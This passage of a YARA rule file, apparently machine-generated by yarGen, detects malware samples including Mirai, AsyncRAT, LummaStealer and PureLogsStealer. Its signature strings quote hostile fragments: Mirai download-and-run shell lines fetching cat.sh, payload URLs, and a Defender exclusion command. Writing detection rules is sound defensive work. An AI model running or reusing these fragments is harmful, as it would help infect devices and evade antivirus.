      $s15 = "-proto=\"%.@.null,null,&quot;https://sites.google.com/view/beliumsoft&quot;]\" data-abuse-reporting-widget-proto=\"%.@.null,&quo" ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule AsyncRAT_signature_ {
   meta:
      description = "dropzone - file AsyncRAT(signature).js"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "947232f33c2aaf3df3952d23c6ce7d611c1cc0dac1f1e2b236ab96a84eb32277"
   strings:
      $s1 = "var equipments = counterevidence.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "            + \"xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' \"" fullword ascii /* score: '24.00'*/
      $s3 = "var undraw = counterevidence.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s4 = "    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'" fullword ascii /* score: '20.00'*/
      $s5 = "            + \"xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' \"" fullword ascii /* score: '19.00'*/
      $s6 = "            + \"xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' \"" fullword ascii /* score: '19.00'*/
      $s7 = "var cyberneticist = derisorily.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s8 = "            + \"xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' \"" fullword ascii /* score: '19.00'*/
      $s9 = "            + \"xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' \"" fullword ascii /* score: '19.00'*/
      $s10 = "    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'" fullword ascii /* score: '15.00'*/
      $s11 = "    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'" fullword ascii /* score: '15.00'*/
      $s12 = "        \"xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' \"" fullword ascii /* score: '15.00'*/
      $s13 = "    /// xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' " fullword ascii /* score: '15.00'*/
      $s14 = "    /// xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' " fullword ascii /* score: '15.00'*/
      $s15 = "    /// xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' " fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      8 of them
}

rule bc21f3f01862f0bddca1a7ed47ed93ae491aeeefe8cd1d95f814c6210da262a1_bc21f3f0 {
   meta:
      description = "dropzone - file bc21f3f01862f0bddca1a7ed47ed93ae491aeeefe8cd1d95f814c6210da262a1_bc21f3f0.js"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "bc21f3f01862f0bddca1a7ed47ed93ae491aeeefe8cd1d95f814c6210da262a1"
   strings:
      $s1 = "var orthostichous = princelier.Get(\"Win32_Process\");" fullword ascii /* score: '28.00'*/
      $s2 = "var myomorphic = princelier.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s3 = "            + \"xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' \"" fullword ascii /* score: '24.00'*/
      $s4 = "var xiphihumeralis = popeyed.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '24.00'*/
      $s5 = "    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'" fullword ascii /* score: '20.00'*/
      $s6 = "            + \"xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' \"" fullword ascii /* score: '19.00'*/
      $s7 = "            + \"xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' \"" fullword ascii /* score: '19.00'*/
      $s8 = "            + \"xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' \"" fullword ascii /* score: '19.00'*/
      $s9 = "            + \"xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' \"" fullword ascii /* score: '19.00'*/
      $s10 = "    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'" fullword ascii /* score: '15.00'*/
      $s11 = "    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'" fullword ascii /* score: '15.00'*/
      $s12 = "        \"xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' \"" fullword ascii /* score: '15.00'*/
      $s13 = "    /// xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' " fullword ascii /* score: '15.00'*/
      $s14 = "    /// xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' " fullword ascii /* score: '15.00'*/
      $s15 = "    /// xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' " fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 100KB and
      8 of them
}

rule Mirai_signature__5fd8490d {
   meta:
      description = "dropzone - file Mirai(signature)_5fd8490d.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5fd8490d3ca5ae394125c37d7bd5b4d5f1cf4dc5010558589f610c0e8a04bfe8"
   strings:
      $s1 = "__stdio_mutex_initializer.3862" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__16679148 {
   meta:
      description = "dropzone - file Mirai(signature)_16679148.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "16679148a73f7b8b1339f778847904d30cc3ca10d6d07674184947fc3e6a6f92"
   strings:
      $s1 = "__stdio_mutex_initializer.3833" fullword ascii /* score: '15.00'*/
      $s2 = "libc/sysdeps/linux/mips/pipe.S" fullword ascii /* score: '10.00'*/
      $s3 = "estridx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__b63c273a {
   meta:
      description = "dropzone - file Mirai(signature)_b63c273a.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b63c273ae02c39024b2b690bd6ba4f4099682f12a2f3550ac50a0848e7d2c5f4"
   strings:
      $s1 = "__stdio_mutex_initializer.3833" fullword ascii /* score: '15.00'*/
      $s2 = "libc/sysdeps/linux/mips/pipe.S" fullword ascii /* score: '10.00'*/
      $s3 = "estridx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__f279e2ac {
   meta:
      description = "dropzone - file Mirai(signature)_f279e2ac.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "f279e2ac99f4355d95769db41066accd329183ac12296c09a7beeafc491daa50"
   strings:
      $s1 = "__stdio_mutex_initializer.4636" fullword ascii /* score: '15.00'*/
      $s2 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s3 = "gethostname.c" fullword ascii /* score: '14.00'*/
      $s4 = "gethostbyname2_r.c" fullword ascii /* score: '14.00'*/
      $s5 = "__GI_gethostbyname2_r" fullword ascii /* score: '14.00'*/
      $s6 = "__GI_gethostname" fullword ascii /* score: '14.00'*/
      $s7 = "__GI_gethostbyname2" fullword ascii /* score: '14.00'*/
      $s8 = "gethostbyname2_r" fullword ascii /* score: '14.00'*/
      $s9 = "gethostbyname2.c" fullword ascii /* score: '14.00'*/
      $s10 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii /* score: '11.00'*/
      $s11 = "/home/landley/work/ab7/build/temp-armv6l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s12 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s13 = "__resolv_attempts" fullword ascii /* score: '11.00'*/
      $s14 = "clock_getres.c" fullword ascii /* score: '9.00'*/
      $s15 = "__GI_clock_getres" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "dropzone - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "bc347f8dcad3af26765caa750eb8588294900dfc7b1164c4c5b7fc09f3843ec0"
   strings:
      $s1 = "Rmofooc.exe" fullword wide /* score: '22.00'*/
      $s2 = "DRmofooc, Version=1.0.547.21779, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "decryptor" fullword wide /* score: '15.00'*/
      $s4 = "ExecuteCache" fullword ascii /* score: '14.00'*/
      $s5 = ".NET Framework 4.6" fullword ascii /* score: '10.00'*/
      $s6 = "PostPolicy" fullword ascii /* score: '9.00'*/
      $s7 = "get_Xjsywkpntk" fullword ascii /* score: '9.00'*/
      $s8 = "infoinstall" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__35088f68 {
   meta:
      description = "dropzone - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_35088f68.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "35088f686498f92f380d5e0d699dae2c867a7cd428ef3b6fe062c540438bbe8b"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\"><assembly" ascii /* score: '40.00'*/
      $s2 = " xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /></requestedPrivile" ascii /* score: '26.00'*/
      $s3 = "ConsoleApp10.exe" fullword wide /* score: '22.00'*/
      $s4 = "ngs><dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware><longPathAware xmlns=\"http://schem" ascii /* score: '17.00'*/
      $s5 = " version=\"1.0.0.0\" name=\"MyApplication.app\" /><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><security><requestedPriv" ascii /* score: '17.00'*/
      $s6 = "http://84.252.121.97/mom/ConsoleApp10.jpg" fullword wide /* score: '15.00'*/
      $s7 = "microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware></windowsSettings></application></assembly>PAPADDINGXXPADDINGPADDIN" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and all of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "dropzone - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "eac358b325b3ddd15ff504b306c6d74e018b27c5b2d394fb41014dc3ebf7e7d3"
   strings:
      $x1 = "ExclusionLoader.exe" fullword wide /* score: '31.00'*/
      $s2 = "https://balensi.sbs/executor.exe" fullword wide /* score: '30.00'*/
      $s3 = "-EncodedCommand " fullword wide /* score: '21.00'*/
      $s4 = "<longPathAware xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware>" fullword ascii /* score: '17.00'*/
      $s5 = "ExclusionLoader" fullword wide /* score: '13.00'*/
      $s6 = "SystemLogs" fullword wide /* score: '12.00'*/
      $s7 = ".NET Framework 4.8" fullword ascii /* score: '10.00'*/
      $s8 = ".NETFramework,Version=v4.8" fullword ascii /* score: '10.00'*/
      $s9 = "<assemblyIdentity version=\"1.0.0.1\" name=\"MyUniqueAppName.v1\"/>" fullword ascii /* score: '8.00'*/
      $s10 = "Add-MpPreference -ExclusionPath '" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature_ {
   meta:
      description = "dropzone - file LummaStealer(signature).html"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "afddad90ca1287e2de3ce9383ecb0dce13a6ec6ed7da28fcfa96f25ed27a98d9"
   strings:
      $x1 = "                            <p>Free Roblox Script Executor with fast injection, undetected bypass, built-in script hub &amp; ant" ascii /* score: '33.00'*/
      $x2 = "                            <p>Azrix is a modern Roblox executor with custom DLL injection, automatic script loading and excelle" ascii /* score: '31.00'*/
      $s3 = "                            <p>Free Roblox Script Executor with fast injection, undetected bypass, built-in script hub &amp; ant" ascii /* score: '30.00'*/
      $s4 = "                            <p>Keyless executor with clean UI, fast injection, script hub, and multi-exploit support. Updated re" ascii /* score: '30.00'*/
      $s5 = "<script src=\"https://cdn.jsdelivr.net/gh/amphetyze/console-ban@main/context-menu-ban.js\"></script> --></head>" fullword ascii /* score: '30.00'*/
      $s6 = "                            <p>KRNL is a powerful and reliable Roblox executor supporting complex scripts, fast injection and hi" ascii /* score: '25.00'*/
      $s7 = "                            <p>Keyless executor with clean UI, fast injection, script hub, and multi-exploit support. Updated re" ascii /* score: '22.00'*/
      $s8 = "                            <p>Proven solution with years of stable operation. Constant updates keep the features up-to-date, an" ascii /* score: '22.00'*/
      $s9 = "                            <p>Nebula is a lightweight yet powerful Roblox executor with frequent updates, bypassing most anti-c" ascii /* score: '21.00'*/
      $s10 = "                            <p>KRNL is a powerful and reliable Roblox executor supporting complex scripts, fast injection and hi" ascii /* score: '21.00'*/
      $s11 = "                            <p>Cubix delivers stable execution with clean design, script hub access, and support for all major R" ascii /* score: '21.00'*/
      $s12 = "                            <p>Advanced script with legit aimbot, FOV circle, ESP, and multiple PvP settings. Fully customizable" ascii /* score: '21.00'*/
      $s13 = "                            <p>Azrix is a modern Roblox executor with custom DLL injection, automatic script loading and excelle" ascii /* score: '20.00'*/
      $s14 = "d the built-in spoofer allows you to bypass the HWID lock (hardware ban) and re-enter the game.</p>" fullword ascii /* score: '20.00'*/
      $s15 = "                            <img src=\"https://static1.thegamerimages.com/wordpress/wp-content/uploads/2023/08/dead-by-daylight-" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__35dc5bfc {
   meta:
      description = "dropzone - file LummaStealer(signature)_35dc5bfc.html"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "35dc5bfcbe1ccc679236e3712b478899203c8f7b0ff97a157990efc14ebb4a7b"
   strings:
      $s1 = "                <a href=\"https://www.mediafire.com/folder/vsz6bixrgdmof/go-soft\"><button>Client <img src=\"./assets/image/maje" ascii /* score: '23.00'*/
      $s2 = "cons_login.svg\" alt=\"\"></button></a>" fullword ascii /* score: '18.00'*/
      $s3 = "                    <a href=\"https://www.mediafire.com/folder/vsz6bixrgdmof/go-soft\"><button>Download</button></a>" fullword ascii /* score: '18.00'*/
      $s4 = "                <a href=\"https://www.mediafire.com/folder/vsz6bixrgdmof/go-soft\"><button>Client <img src=\"./assets/image/maje" ascii /* score: '12.00'*/
      $s5 = "    src=\"https://code.jquery.com/jquery-3.7.1.slim.js\"" fullword ascii /* score: '12.00'*/
      $s6 = "                        <a href=\"https://www.mediafire.com/folder/vsz6bixrgdmof/go-soft\">Main<img src=\"./assets/image/arrowLi" ascii /* score: '12.00'*/
      $s7 = "                        <a href=\"https://www.mediafire.com/folder/vsz6bixrgdmof/go-soft\">Main<img src=\"./assets/image/arrowLi" ascii /* score: '12.00'*/
      $s8 = "    <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-YvpcrYf0tY3l" ascii /* score: '11.00'*/
      $s9 = "    <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-YvpcrYf0tY3l" ascii /* score: '11.00'*/
      $s10 = "0NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz\" crossorigin=\"anonymous\"></script>" fullword ascii /* score: '10.00'*/
      $s11 = "                <a href=\"#catalog\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 20 20\" fill=\"none\" xmlns=\"http://www.w3.o" ascii /* score: '10.00'*/
      $s12 = "rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M12.5003 -0.625C12.8455 -0.625 13.1253 -0.345178 13.1253 -1.49012e-08V0.833333C13.125" ascii /* score: '8.00'*/
      $s13 = ".png\" alt=\"catalog-item\">" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      8 of them
}

rule LummaStealer_signature__2 {
   meta:
      description = "dropzone - file LummaStealer(signature).unknown"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "dcfd187b5391f3199e3fb936ea3f7ff34ba3310146c9c97c27c906cc68c5f781"
   strings:
      $s1 = "<!DOCTYPE html><html lang=3D\"en\" data-darkreader-proxy-injected=3D\"true\"><h=" fullword ascii /* score: '25.00'*/
      $s2 = ".loader-section .description { color: var(--text-medium); max-width: 900px;=" fullword ascii /* score: '19.00'*/
      $s3 = " bypass system and real-time adaptation protocols.</p>" fullword ascii /* score: '18.00'*/
      $s4 = "Content-Location: https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" fullword ascii /* score: '18.00'*/
      $s5 = "-display: swap; src: url(\"https://fonts.gstatic.com/s/inter/v19/UcC73FwrK3i=" fullword ascii /* score: '17.00'*/
      $s6 = "al security updates are pushed instantly to all users via encrypted channel=" fullword ascii /* score: '17.00'*/
      $s7 = ".btn-secondary::after { content: \"\"; position: absolute; top: 0px; left: -1=" fullword ascii /* score: '16.00'*/
      $s8 = "            <p class=3D\"description\">Download our state-of-the-art loader f=" fullword ascii /* score: '16.00'*/
      $s9 = ".loader-section { background: rgba(15, 15, 15, 0.3); backdrop-filter: blur(=" fullword ascii /* score: '15.00'*/
      $s10 = "Content-ID: <frame-1EE41E9D35DD4FF857D31CBC1A31B330@mhtml.blink>" fullword ascii /* score: '14.00'*/
      $s11 = "                    <span>Download Loader</span>" fullword ascii /* score: '14.00'*/
      $s12 = ".footer-logo .logo { font-size: 2rem; margin-bottom: 10px; }" fullword ascii /* score: '13.00'*/
      $s13 = ".section-divider::before { content: \"\"; position: absolute; top: -1px; left=" fullword ascii /* score: '13.00'*/
      $s14 = ".loader-section .container { text-align: center; }" fullword ascii /* score: '13.00'*/
      $s15 = ".logo { font-size: 3rem; font-weight: 900; color: var(--primary-blue); lett=" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x7246 and filesize < 100KB and
      8 of them
}

rule ACRStealer_signature_ {
   meta:
      description = "dropzone - file ACRStealer(signature).7z"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2c74149f8f06e0791e1e23fdd0e771dc81cd86b9f72e02e3121484bc24d11bc8"
   strings:
      $s1 = "Yl - z(" fullword ascii /* score: '9.00'*/
      $s2 = "@6>d?&\\|" fullword ascii /* score: '9.00'*/ /* hex encoded string 'm' */
   condition:
      uint16(0) == 0x7a37 and filesize < 14000KB and
      all of them
}

rule ACRStealer_signature__2 {
   meta:
      description = "dropzone - file ACRStealer(signature).zip"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "44c59f59956dc314db2d2049f01e7cca91b38e769ab97381e69e5de8520dd18b"
   strings:
      $x1 = "Upd@te!D/x86/api-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x2 = "Upd@te!D/x86/api-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $s3 = "Upd@te!D/Qt5Widgets.dll" fullword ascii /* score: '25.00'*/
      $s4 = "Upd@te!D/x86/api-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s5 = "Upd@te!D/x86/api-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s6 = "Upd@te!D/x86/api-ms-win-crt-private-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s7 = "Upd@te!D/x86/api-ms-win-core-sysinfo-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s8 = "Upd@te!D/x86/api-ms-win-core-timezone-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s9 = "Upd@te!D/MSVCP120.dll" fullword ascii /* score: '20.00'*/
      $s10 = "Upd@te!D/x86/api-ms-win-crt-heap-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s11 = "Upd@te!D/x86/api-ms-win-core-profile-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s12 = "Upd@te!D/x86/api-ms-win-crt-math-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s13 = "Upd@te!D/x86/api-ms-win-core-util-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "Upd@te!D/MSVCR120.dll" fullword ascii /* score: '20.00'*/
      $s15 = "Upd@te!D/x86/api-ms-win-crt-environment-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 24000KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__15779680 {
   meta:
      description = "dropzone - file Mirai(signature)_15779680.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1577968035891d9ef376e9120e6846470022c3b1a36c79c923ba67cc156dd47e"
   strings:
      $s1 = "POST /login.htm HTTP/1.1" fullword ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '29.00'*/
      $s3 = "command=login&username=%s&password=%s" fullword ascii /* score: '26.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root/ wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '24.00'*/
      $s7 = "%s: '%s' is not an ELF executable for csky" fullword ascii /* score: '17.50'*/
      $s8 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s9 = "/proc/%s/cmdline" fullword ascii /* score: '15.00'*/
      $s10 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
      $s11 = "Host: %s:554" fullword ascii /* score: '14.50'*/
      $s12 = "rsyslogd" fullword ascii /* score: '13.00'*/
      $s13 = "HEAD / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s14 = "[0mNo shell available" fullword ascii /* score: '12.00'*/
      $s15 = "[0mWrong password!" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      8 of them
}

rule Mirai_signature__17260501 {
   meta:
      description = "dropzone - file Mirai(signature)_17260501.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1726050166ff657baee8cf2d39511a3aac31c17286610c99f3a6bf7efdcc2c07"
   strings:
      $s1 = "POST /login.htm HTTP/1.1" fullword ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '29.00'*/
      $s3 = "command=login&username=%s&password=%s" fullword ascii /* score: '26.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root/ wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '24.00'*/
      $s7 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s8 = "/proc/%s/cmdline" fullword ascii /* score: '15.00'*/
      $s9 = "Host: %s:554" fullword ascii /* score: '14.50'*/
      $s10 = "rsyslogd" fullword ascii /* score: '13.00'*/
      $s11 = "HEAD / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s12 = "[0mNo shell available" fullword ascii /* score: '12.00'*/
      $s13 = "[0mWrong password!" fullword ascii /* score: '12.00'*/
      $s14 = "/usr/sbin/klogd" fullword ascii /* score: '12.00'*/
      $s15 = "/usr/sbin/syslogd" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__08ddee8b {
   meta:
      description = "dropzone - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_08ddee8b.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "08ddee8b2b31a71ee61dd31bf30b5c4c30a8129d3c40e7cb6f94615eb779aae3"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "DEEr:;<c122T)**F!!!8" fullword ascii /* score: '9.00'*/
      $s6 = "DEEr:;<b122S)**E!!!7" fullword ascii /* score: '9.00'*/
      $s7 = "DEEr:;;c122T)*)F!!!8" fullword ascii /* score: '9.00'*/
      $s8 = "DEEs:;;c122T)*)F!!!8" fullword ascii /* score: '9.00'*/
      $s9 = "<!!!A#%$F&'&K(*)P+-,U.0/Y132^465b687g9;:k;=<o=?>s?A@wACBzCFD}DGE" fullword ascii /* score: '9.00'*/
      $s10 = "CDDs:;;d122U)*)F!!!8" fullword ascii /* score: '9.00'*/
      $s11 = "BDCs:::c021T())F!!!8" fullword ascii /* score: '9.00'*/
      $s12 = "HII|BDCq;==g677\\011R*++H&''@!!!7" fullword ascii /* score: '9.00'*/
      $s13 = "DEEq:;<b122S)**E!!!7" fullword ascii /* score: '9.00'*/
      $s14 = "NPO{FHGo>@@b788V/00J())>!!!3" fullword ascii /* score: '9.00'*/
      $s15 = "HJJuBCCk<>>a687W011N+,,D%'&<!!!4" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__17925c14 {
   meta:
      description = "dropzone - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_17925c14.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "17925c14775e376db32a22cc1a6f88a6fce33db6f11fde9a45bfa637445a2594"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
